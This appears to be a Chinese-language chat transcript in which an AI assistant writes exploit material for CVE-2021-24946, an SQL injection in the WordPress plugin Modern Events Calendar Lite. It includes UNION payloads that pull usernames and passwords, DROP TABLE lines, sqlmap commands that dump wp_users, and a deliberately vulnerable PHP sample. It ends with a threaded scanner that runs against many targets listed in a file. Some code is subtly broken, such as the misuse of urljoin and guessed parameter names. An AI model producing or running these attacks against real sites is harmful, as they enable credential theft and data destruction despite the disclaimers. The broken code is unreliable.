CVE-2021-24946 是與 WordPress 插件 Modern Events Calendar Lite (版本低於 6.1.5) 相關的安全漏洞，該漏洞涉及 SQL 注入，原因是未對 time 參數進行適當的清理和轉義，允許攻擊者透過 SQL 語句執行惡意操作。以下是有關此漏洞的驗證測試用例和語法的說明，特別針對如何測試此漏洞以及確保修補後的安全性。

1. 漏洞概述

CVE ID: CVE-2021-24946
影響的軟件: Modern Events Calendar Lite WordPress 插件 (版本 < 6.1.5)
漏洞類型: SQL 注入 (CWE-89: Improper Neutralization of Special Elements used in an SQL Command)
描述: 該漏洞允許攻擊者在 time 參數中注入惡意 SQL 代碼，由於插件未正確清理或轉義該參數，導致潛在的數據庫洩露、修改或未授權訪問。
參考:


2. 驗證測試用例
為了驗證此漏洞是否存在，測試人員需要模擬攻擊者如何利用 time 參數進行 SQL 注入。以下是測試用例的步驟和方法：
測試用例 1: 基本的 SQL 注入測試
目的: 確認 time 參數是否未經清理，允許 SQL 注入。

環境設置:

安裝 Modern Events Calendar Lite 插件（版本 < 6.1.5）。
確保 WordPress 環境連接到一個可監控的數據庫（例如 MySQL）。
使用 Burp Suite、Postman 或瀏覽器開發者工具來攔截和修改 HTTP 請求。


測試步驟:

訪問包含 time 參數的插件相關頁面或 API 端點（例如日曆或事件查詢頁面）。
修改 time 參數，注入簡單的 SQL 語法，例如：
texttime=1' OR '1'='1
或更複雜的注入：
texttime=1'; SELECT * FROM wp_users WHERE 1=1; --

提交請求並觀察響應。


預期結果:

如果漏洞存在，注入的 SQL 可能導致：

異常數據返回（例如顯示所有用戶數據）。
數據庫錯誤訊息（例如 MySQL 語法錯誤）。
頁面行為異常（例如繞過身份驗證或顯示未授權數據）。


如果修補完成（版本 ≥ 6.1.5），請求應被拒絕或無異常響應。


工具建議:

sqlmap: 自動化 SQL 注入測試工具。
bashsqlmap -u "http://target-site.com/?page=calendar&time=[注入點]" --dbs

Burp Suite: 攔截並手動修改 HTTP 請求。
Postman: 用於構造和發送帶有惡意 time 參數的請求。



測試用例 2: 負面測試（修補後驗證）
目的: 確認修補後的版本是否已解決漏洞。

環境設置:

更新插件至版本 6.1.5 或更高。
使用與上述相同的測試環境。


測試步驟:

重複測試用例 1 的注入步驟，使用相同的 SQL 注入語法。
觀察系統是否正確處理輸入，例如：

參數是否被正確轉義或過濾。
是否返回錯誤訊息或拒絕惡意請求。




預期結果:

修補後的版本應阻止 SQL 注入，響應應為正常行為或錯誤提示（例如「無效輸入」）。
數據庫不應洩露任何敏感信息。



測試用例 3: 邊界測試
目的: 測試 time 參數的邊界值是否會觸發異常行為。

測試步驟:

輸入極長的 time 參數值（例如 10,000 字元）。
輸入特殊字元（例如 ', ", ;, --, /*）。
輸入非預期的數據類型（例如 JSON、隨機字串）。
示例：
texttime=999999999999999999999999999
time='; DROP TABLE wp_users; --
time={"malicious":"payload"}



預期結果:

未修補版本可能因長輸入或特殊字元導致崩潰或洩露錯誤訊息。
修補後版本應安全處理這些輸入，無異常行為。




3. SQL 注入語法示例
以下是可能用於測試的 SQL 注入語法，這些語法針對 time 參數設計，試圖利用漏洞：

基本注入:
texttime=1' OR '1'='1
這將檢查是否能繞過條件限制，返回所有數據。
數據提取:
texttime=1' UNION SELECT username, password FROM wp_users; --
嘗試從 wp_users 表中提取用戶名和密碼。
數據庫結構探查:
texttime=1' UNION SELECT table_name, column_name FROM information_schema.columns; --
獲取數據庫的表和欄位信息。
破壞性測試（僅在沙盒環境中）:
texttime=1'; DROP TABLE wp_events; --
嘗試刪除事件表（注意：僅在測試環境中使用，切勿在生產環境執行）。

注意: 測試時應在合法授權的環境中進行，避免違反法律或道德規範。遵循負責任披露原則（Coordinated Vulnerability Disclosure）。

4. 修補建議與驗證
根據 CVE-2021-24946 的描述，修補措施包括：

輸入清理: 對 time 參數進行嚴格的清理和轉義，防止 SQL 語法注入。
參數化查詢: 使用準備語句（Prepared Statements）或參數化查詢來處理用戶輸入。
版本升級: 更新至 Modern Events Calendar Lite 6.1.5 或更高版本。

驗證修補的語法檢查:
檢查插件代碼中是否使用了以下安全措施：
php// 範例：使用 WordPress 的 $wpdb 進行參數化查詢
global $wpdb;
$time = sanitize_text_field($_GET['time']); // 清理輸入
$query = $wpdb->prepare("SELECT * FROM {$wpdb->prefix}events WHERE time = %s", $time);
$results = $wpdb->get_results($query);

確保 time 參數被 sanitize_text_field() 或類似函數清理。
檢查是否使用 $wpdb->prepare() 來防止 SQL 注入。


5. 安全測試注意事項

環境: 在隔離的沙盒環境中進行測試，避免影響生產系統。
合法性: 確保有權限測試目標系統，遵守當地法律和道德規範。
日誌監控: 檢查數據庫和應用程式日誌，確認是否有異常查詢被執行。
工具: 使用 sqlmap、Burp Suite 或 OWASP ZAP 進行自動化漏洞掃描。


6. 參考資料

CVE 詳細信息: https://www.cvedetails.com/cve/CVE-2021-24946/
WordPress 插件安全最佳實踐: https://developer.wordpress.org/plugins/security/
OWASP SQL 注入防範指南: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

如果您需要更具體的測試腳本（例如 sqlmap 命令）或代碼範例，請告訴我！網頁3.5秒上面再修改成
具體的測試腳本（例如 sqlmap 命令）或代碼範例思考了9sCVE-2021-24946 是與 WordPress 插件 Modern Events Calendar Lite (版本低於 6.1.5) 相關的安全漏洞，該漏洞涉及 SQL 注入，原因是未對 time 參數進行適當的清理和轉義，允許攻擊者透過 SQL 語句執行惡意操作。以下是聚焦在具體測試腳本（例如 sqlmap 命令）和代碼範例的內容，包含如何使用工具測試漏洞、模擬攻擊的 PHP/SQL 代碼範例，以及修補後的防護代碼。這些範例可在本地測試環境中使用（如 XAMPP 或 Docker 搭建的 WordPress 實例）。

1. 漏洞概述（簡要）

CVE ID: CVE-2021-24946
影響的軟件: Modern Events Calendar Lite WordPress 插件 (版本 < 6.1.5)
漏洞類型: SQL 注入 (CWE-89)
描述: 攻擊者可透過 time 參數注入惡意 SQL，導致數據洩露或修改。
參考: CVE 詳細信息


2. 具體測試腳本
以下提供實用的測試腳本，使用 sqlmap 進行自動化測試，以及手動腳本（使用 curl 或 Python）。測試前，請在本地或隔離環境中設置漏洞版本的插件，並確保有權限。
腳本 1: sqlmap 自動化測試腳本
sqlmap 是一款開源 SQL 注入測試工具，可自動檢測和利用漏洞。假設目標 URL 是 http://localhost/wp/?mec_time=[注入點]（根據插件的日曆頁面調整）。

安裝 sqlmap（如果未安裝）：git clone https://github.com/sqlmapproject/sqlmap.git 並進入目錄。
基本 sqlmap 命令（檢測漏洞）：
bashpython sqlmap.py -u "http://localhost/wp/?mec_time=1" --batch --level=3 --risk=3 --dbs

解釋：-u 指定 URL，--level=3 增加測試深度，--risk=3 允許更高風險注入，--dbs 嘗試列出數據庫。
預期輸出（如果漏洞存在）：sqlmap 會報告注入點，並列出如 wp_users 等數據庫。


進階 sqlmap 命令（提取數據）：
bashpython sqlmap.py -u "http://localhost/wp/?mec_time=1" --batch --dump -D wordpress -T wp_users --columns

解釋：--dump 提取表數據，-D wordpress 指定數據庫，-T wp_users 指定用戶表。
預期輸出：提取用戶名、密碼哈希等（僅在測試環境中使用）。


腳本化 sqlmap 測試（使用 Bash 腳本自動化多個測試）：
bash#!/bin/bash
TARGET_URL="http://localhost/wp/?mec_time=1"
sqlmap -u "$TARGET_URL" --batch --level=3 --risk=3 --dbs > output_dbs.txt
sqlmap -u "$TARGET_URL" --batch --dump -D wordpress -T wp_users > output_users.txt
echo "測試完成，檢查 output_*.txt 文件。"

運行：chmod +x test_sqlmap.sh && ./test_sqlmap.sh



腳本 2: curl 手動注入測試腳本
使用 curl 模擬 HTTP 請求注入 SQL。

基本 curl 命令：
bashcurl "http://localhost/wp/?mec_time=1'%20OR%20'1'='1" -v

解釋：注入 ' OR '1'='1 來檢查是否返回所有事件數據。-v 顯示詳細響應。


Bash 腳本化多個注入測試：
bash#!/bin/bash
TARGET="http://localhost/wp/?mec_time="
PAYLOADS=(
  "1'%20OR%20'1'='1"
  "1'%20UNION%20SELECT%20username,password%20FROM%20wp_users;--"
  "1';%20DROP%20TABLE%20test_table;--"  # 僅測試環境
)
for payload in "${PAYLOADS[@]}"; do
  echo "測試 payload: $payload"
  curl "$TARGET$payload" -s | grep -i "error\|username\|password"  # 檢查洩露
done

運行：chmod +x curl_test.sh && ./curl_test.sh
預期：未修補版本可能返回數據庫錯誤或數據；修補後應無異常。



腳本 3: Python 腳本模擬攻擊
使用 Python 的 requests 庫發送注入請求。

Python 腳本範例：
pythonimport requests

target_url = "http://localhost/wp/?mec_time="
payloads = [
    "1' OR '1'='1",
    "1' UNION SELECT username, password FROM wp_users; --",
    "1'; SELECT SLEEP(5); --"  # 時間基注入測試延遲
]

for payload in payloads:
    response = requests.get(target_url + payload)
    print(f"Payload: {payload}")
    print(f"Status: {response.status_code}")
    if "error" in response.text.lower() or "username" in response.text.lower():
        print("潛在漏洞: 檢測到洩露或錯誤")
    print("---")

運行：python test_injection.py
預期：檢查響應是否包含敏感數據或延遲（表示注入成功）。




3. 代碼範例
以下是模擬漏洞的 PHP/SQL 代碼範例（基於插件的潛在漏洞代碼），以及修補後的版本。這些可在本地 PHP 環境測試。
範例 1: 漏洞代碼（未清理的 SQL 查詢）
這模擬插件中易受攻擊的代碼。
php<?php
// 模擬 Modern Events Calendar Lite 的漏洞代碼
$time = $_GET['time'];  // 未清理
$mysqli = new mysqli("localhost", "user", "pass", "wordpress");

$query = "SELECT * FROM wp_events WHERE time = '$time'";  // 易注入
$result = $mysqli->query($query);

if ($result) {
    while ($row = $result->fetch_assoc()) {
        echo "Event: " . $row['event_name'] . "<br>";
    }
} else {
    echo "錯誤: " . $mysqli->error;  // 可能洩露錯誤
}
?>

測試：訪問 http://localhost/test.php?time=1' OR '1'='1，應返回所有事件。

範例 2: 修補後的防護代碼
使用參數化查詢防止注入。
php<?php
// 修補版本，使用準備語句
$time = sanitize_text_field($_GET['time']);  // WordPress 清理函數

$mysqli = new mysqli("localhost", "user", "pass", "wordpress");

$stmt = $mysqli->prepare("SELECT * FROM wp_events WHERE time = ?");
$stmt->bind_param("s", $time);  // 綁定參數
$stmt->execute();
$result = $stmt->get_result();

if ($result) {
    while ($row = $result->fetch_assoc()) {
        echo "Event: " . $row['event_name'] . "<br>";
    }
} else {
    echo "無結果或無效輸入。";
}
$stmt->close();
?>

測試：使用相同注入 URL，應無異常返回。

範例 3: SQL 注入 payload 代碼生成器（Python）
用於生成測試 payload。
pythondef generate_sql_payloads(base="1"):
    return [
        f"{base}' OR '1'='1",
        f"{base}' UNION SELECT database(), user(), version(); --",
        f"{base}'; WAITFOR DELAY '0:0:5'; --"  # MSSQL 時間基
    ]

payloads = generate_sql_payloads()
for p in payloads:
    print(p)

運行：產生 payload 清單，用於上述腳本。


4. 測試注意事項

環境: 使用 Docker 搭建 WordPress + 漏洞插件：docker run -p 80:80 -v $(pwd)/plugins:/var/www/html/wp-content/plugins wordpress。
工具版本: sqlmap 最新版；Python 3+ with requests。
安全: 僅在沙盒環境測試，避免生產系統。修補後重測確認。
驗證修補: 更新插件至 6.1.5+，重跑腳本，應無注入成功。

如果需要更多自訂腳本（如整合 Burp Suite）或特定環境的調整，請提供細節！



改進後的 Python 腳本：多目標 SQL 注入驗證
功能

多目標支持：從檔案或清單輸入多個目標 URL。
多種 Payload：測試多個 SQL 注入 payload，包括基本注入、聯合查詢和時間基注入。
並行處理：使用多執行緒加速測試。
結果記錄：將測試結果儲存到檔案，並標記潛在漏洞。
錯誤處理：處理網絡錯誤、超時等問題。

腳本內容
pythonimport requests
import threading
import time
import os
from datetime import datetime
from urllib.parse import urljoin

# 設置請求超時和 User-Agent
TIMEOUT = 5
HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

# SQL 注入 payload 清單
PAYLOADS = [
    "1' OR '1'='1",  # 基本注入
    "1' UNION SELECT username, password FROM wp_users; --",  # 提取用戶數據
    "1' AND SLEEP(5); --",  # 時間基注入（MySQL）
    "1' UNION SELECT database(), user(), version(); --",  # 提取數據庫信息
    "1'; DROP TABLE test_table; --"  # 破壞性測試（僅沙盒環境）
]

# 目標 URL 清單（可從檔案讀取）
TARGET_URLS = [
    "http://localhost/wp/?mec_time=",
    # 添加更多目標，例如："http://example.com/wp/?mec_time="
]

# 結果儲存檔案
LOG_FILE = f"sql_injection_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

def log_result(url, payload, status, response_time, content_snippet, is_vulnerable):
    """記錄測試結果到檔案"""
    with open(LOG_FILE, 'a') as f:
        f.write(f"[*] 時間: {datetime.now()}\n")
        f.write(f"[*] 目標: {url}\n")
        f.write(f"[*] Payload: {payload}\n")
        f.write(f"[*] 狀態碼: {status}\n")
        f.write(f"[*] 響應時間: {response_time:.2f} 秒\n")
        f.write(f"[*] 響應片段: {content_snippet[:200]}\n")
        f.write(f"[*] 潛在漏洞: {'是' if is_vulnerable else '否'}\n")
        f.write("-" * 50 + "\n")

def test_sql_injection(url, payload):
    """測試單個 URL 和 payload"""
    try:
        full_url = urljoin(url, payload)
        start_time = time.time()
        response = requests.get(full_url, headers=HEADERS, timeout=TIMEOUT)
        response_time = time.time() - start_time

        # 檢查是否可能存在漏洞
        is_vulnerable = False
        content_snippet = response.text.lower()

        # 判斷條件
        if "error" in content_snippet or "mysql" in content_snippet:
            is_vulnerable = True  # 數據庫錯誤洩露
        elif "username" in content_snippet or "password" in content_snippet:
            is_vulnerable = True  # 敏感數據洩露
        elif "SLEEP(5)" in payload and response_time > 4.5:
            is_vulnerable = True  # 時間基注入成功

        log_result(url, payload, response.status_code, response_time, content_snippet, is_vulnerable)
        
        print(f"[+] 測試 {url} with {payload}")
        print(f"    狀態: {response.status_code}, 時間: {response_time:.2f} 秒")
        print(f"    漏洞: {'檢測到' if is_vulnerable else '未檢測到'}")
        
    except requests.exceptions.RequestException as e:
        log_result(url, payload, "錯誤", 0, str(e), False)
        print(f"[-] 錯誤 {url} with {payload}: {e}")

def test_target(target_url):
    """對單個目標執行所有 payload 測試"""
    for payload in PAYLOADS:
        test_sql_injection(target_url, payload)

def load_targets_from_file(file_path):
    """從檔案讀取目標 URL"""
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []

def main():
    # 如果有目標檔案，讀取之
    target_file = "targets.txt"
    if os.path.exists(target_file):
        global TARGET_URLS
        TARGET_URLS.extend(load_targets_from_file(target_file))

    if not TARGET_URLS:
        print("[-] 無目標 URL，請在腳本中設置 TARGET_URLS 或提供 targets.txt")
        return

    print(f"[*] 開始測試 {len(TARGET_URLS)} 個目標，Payload 數量: {len(PAYLOADS)}")
    
    # 使用多執行緒測試
    threads = []
    for url in TARGET_URLS:
        thread = threading.Thread(target=test_target, args=(url,))
        threads.append(thread)
        thread.start()

    # 等待所有執行緒完成
    for thread in threads:
        thread.join()

    print(f"[*] 測試完成，結果已儲存至 {LOG_FILE}")

if __name__ == "__main__":
    main()

使用說明

環境設置：

安裝 Python 3 和 requests 庫：pip install requests
設置 WordPress 測試環境（例如使用 Docker：docker run -p 80:80 wordpress）。
安裝 Modern Events Calendar Lite 插件（版本 < 6.1.5）進行漏洞測試，或版本 ≥ 6.1.5 驗證修補。


配置目標：

直接修改腳本：在 TARGET_URLS 列表中添加目標 URL，例如：
pythonTARGET_URLS = [
    "http://localhost/wp/?mec_time=",
    "http://test-site.com/wp/?mec_time="
]

使用檔案：創建 targets.txt，每行一個 URL，例如：
texthttp://localhost/wp/?mec_time=
http://test-site.com/wp/?mec_time=
腳本會自動讀取檔案中的目標。


運行腳本：

儲存腳本為 sql_injection_test.py。
執行：python sql_injection_test.py
腳本將並行測試所有目標和 payload，並將結果儲存到帶時間戳的日誌檔案（例如 sql_injection_test_20250821_143022.txt）。


結果分析：

日誌檔案包含每個請求的詳細信息：目標 URL、payload、狀態碼、響應時間、響應片段和漏洞狀態。
漏洞檢測條件：

響應包含「error」或「mysql」：可能洩露數據庫錯誤。
響應包含「username」或「password」：可能洩露敏感數據。
時間基注入（SLEEP(5)）響應時間 > 4.5 秒：確認漏洞。




修補驗證：

更新插件至 6.1.5 或更高版本。
重跑腳本，確認無「漏洞檢測到」的結果。




示例日誌輸出
假設測試兩個目標，部分日誌可能如下：
text[*] 時間: 2025-08-21 14:34:56
[*] 目標: http://localhost/wp/?mec_time=1' OR '1'='1
[*] Payload: 1' OR '1'='1
[*] 狀態碼: 200
[*] 響應時間: 0.12 秒
[*] 響應片段: <html>...event list...
[*] 潛在漏洞: 是
--------------------------------------------------
[*] 時間: 2025-08-21 14:34:57
[*] 目標: http://test-site.com/wp/?mec_time=1' AND SLEEP(5); --
[*] Payload: 1' AND SLEEP(5); --
[*] 狀態碼: 200
[*] 響應時間: 5.02 秒
[*] 潛在漏洞: 是
--------------------------------------------------

注意事項

合法性：僅在合法授權的環境（如本地或自有站點）測試，避免違反法律。
沙盒環境：建議使用 Docker 或虛擬機（如 XAMPP）搭建 WordPress 測試環境。
網路穩定性：腳本包含超時處理（TIMEOUT=5），可根據需要調整。
擴展性：可添加更多 payload 或自訂檢測條件（例如檢查特定錯誤訊息）。
修補確認：測試修補版本（6.1.5+）時，應無漏洞提示。

如果需要進一步自訂（例如特定 payload、代理支持或更詳細的報告格式），請提供要求！